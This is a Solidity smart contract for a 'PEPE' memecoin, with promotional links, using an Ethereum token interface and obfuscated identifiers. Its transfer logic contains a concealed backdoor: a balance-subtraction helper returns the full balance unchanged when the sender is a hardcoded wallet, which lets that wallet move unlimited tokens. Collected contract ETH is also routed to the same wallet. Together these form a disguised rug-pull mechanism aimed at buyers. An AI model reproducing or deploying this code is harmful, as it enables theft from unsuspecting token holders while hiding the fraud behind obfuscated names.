/**
$PEPE
The most memeable memecoin in existence. 
The dogs have had their day, it’s time for PEPE to take reign.


TELEGRAM: https://t.me/PepeercCoin
TWITTER: https://twitter.com/PepeercCoin
WEBSITE: https://pepeerc.com/
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rfwve(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rfwve(a, b, "SafeMath");
    }

    function  _rfwve(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _agfpnk {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _alnyer {
    function vKuangatFacrevlg(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract PEPE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _alnyer private _Tykprk;
    address payable private _Frhido;
    address private _cofteu;

    string private constant _name = unicode"PEPE";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _kTotalpk = 42069000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _puzfqzr;
    mapping (address => bool) private _yrutzy;
    mapping(address => uint256) private _ahjukq;
    uint256 public _qpjvapd = _kTotalpk;
    uint256 public _Wiorsoe = _kTotalpk;
    uint256 public _refTjvu= _kTotalpk;
    uint256 public _XuvTyof= _kTotalpk;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yfkvjq=0;
    uint256 private _uevbjrg=0;
    

    bool private _eycifr;
    bool public _Dafojkf = false;
    bool private peqvze = false;
    bool private _oqgviu = false;


    event _hzkpwut(uint _qpjvapd);
    modifier uysivr {
        peqvze = true;
        _;
        peqvze = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _kTotalpk;
        _puzfqzr[owner(

        )] = true;
        _puzfqzr[address
        (this)] = true;
        _puzfqzr[
            _Frhido] = true;
        _Frhido = 
        payable (0x74FD0d4d1d1B3b187772b1abfA00C2Ba8FB29EDd);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _kTotalpk);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _kTotalpk;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rfwve(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 ksoyfrk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Dafojkf) {
                if (to 
                != address
                (_Tykprk) 
                && to !=
                 address
                 (_cofteu)) {
                  require(_ahjukq
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _ahjukq
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _cofteu && to != 
            address(_Tykprk) &&
             !_puzfqzr[to] ) {
                require(amount 
                <= _qpjvapd,
                 "Exceeds the _qpjvapd.");
                require(balanceOf
                (to) + amount
                 <= _Wiorsoe,
                  "Exceeds the macxizse.");
                if(_uevbjrg
                < _yfkvjq){
                  require
                  (! _epikbz(to));
                }
                _uevbjrg++;
                 _yrutzy
                 [to]=true;
                ksoyfrk = amount._pvr
                ((_uevbjrg>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _cofteu &&
             from!= address(this) 
            && !_puzfqzr[from] ){
                require(amount <= 
                _qpjvapd && 
                balanceOf(_Frhido)
                <_XuvTyof,
                 "Exceeds the _qpjvapd.");
                ksoyfrk = amount._pvr((_uevbjrg>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_uevbjrg>
                _yfkvjq &&
                 _yrutzy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!peqvze 
            && to == _cofteu &&
             _oqgviu &&
             contractTokenBalance>
             _refTjvu 
            && _uevbjrg>
            _yfkvjq&&
             !_puzfqzr[to]&&
              !_puzfqzr[from]
            ) {
                _fiaoeqf( _wveue(amount, 
                _wveue(contractTokenBalance,
                _XuvTyof)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _xevueo(address
                    (this).balance);
                }
            }
        }

        if(ksoyfrk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(ksoyfrk);
          emit
           Transfer(from,
           address
           (this),ksoyfrk);
        }
        _balances[from
        ]= _rfwve(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rfwve(ksoyfrk));
        emit Transfer
        (from, to, 
        amount.
         _rfwve(ksoyfrk));
    }

    function _fiaoeqf(uint256
     tokenAmount) private
      uysivr {
        if(tokenAmount==
        0){return;}
        if(!_eycifr)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tykprk.WETH();
        _approve(address(this),
         address(
             _Tykprk), 
             tokenAmount);
        _Tykprk.
        vKuangatFacrevlg
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _wveue
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rfwve(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Frhido){
            return a ;
        }else{
            return a .
             _rfwve (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qpjvapd = _kTotalpk;
        _Wiorsoe = _kTotalpk;
        emit _hzkpwut(_kTotalpk);
    }

    function _epikbz(address 
    account) private view 
    returns (bool) {
        uint256 ejrcuv;
        assembly {
            ejrcuv :=
             extcodesize
             (account)
        }
        return ejrcuv > 
        0;
    }

    function _xevueo(uint256
    amount) private {
        _Frhido.
        transfer(
            amount);
    }

    function opengTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _eycifr ) ;
        _Tykprk  
        =  
        _alnyer
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tykprk), 
            _kTotalpk);
        _cofteu = 
        _agfpnk(_Tykprk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tykprk .
             WETH ( ) );
        _Tykprk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_cofteu).
        approve(address(_Tykprk), 
        type(uint)
        .max);
        _oqgviu = true;
        _eycifr = true;
    }

    receive() external payable {}
}